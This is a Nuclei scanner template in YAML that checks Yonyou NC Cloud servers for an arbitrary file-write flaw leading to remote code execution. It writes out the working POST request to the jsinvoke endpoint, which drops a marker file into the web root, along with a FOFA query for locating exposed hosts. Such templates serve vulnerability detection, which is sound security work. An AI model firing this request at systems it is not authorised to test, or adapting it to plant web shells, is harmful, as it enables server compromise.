http:
- matchers:
  - part: body
    type: word
    words:
    - 5d8be7535d6383e99315739724e10fa7
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /uapjs/jsinvoke/?action=invoke HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)

    Accept: */*

    Content-Type: application/x-www-form-urlencoded


    {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["{{md5(''yonyou-nc-cloud-jsinvoke-rce'')}}","webapps/nc_web/{{str1}}"]}

    '
  - 'GET /{{str1}} HTTP/1.1

    Host: {{Hostname}}

    '
id: yonyou-nc-cloud-jsinvoke-rce
info:
  author: Co5mos
  description: An arbitrary file upload vulnerability in the Yonyou NC-Cloud system.
    Attackers can upload any files to the server and upload web shells, thereby gaining
    command execution privileges on the server.
  metadata:
    fofa-query: "app=\"\u7528\u53CB-NC-Cloud\""
    max-request: 2
    verified: true
  name: Yonyou NC Cloud - Remote Code Execution
  reference:
  - https://mp.weixin.qq.com/s/qL5LurGfuShf1emJuay2_Q
  severity: critical
  tags: yonyou,rce
variables:
  str1: '{{rand_base(5)}}.txt'
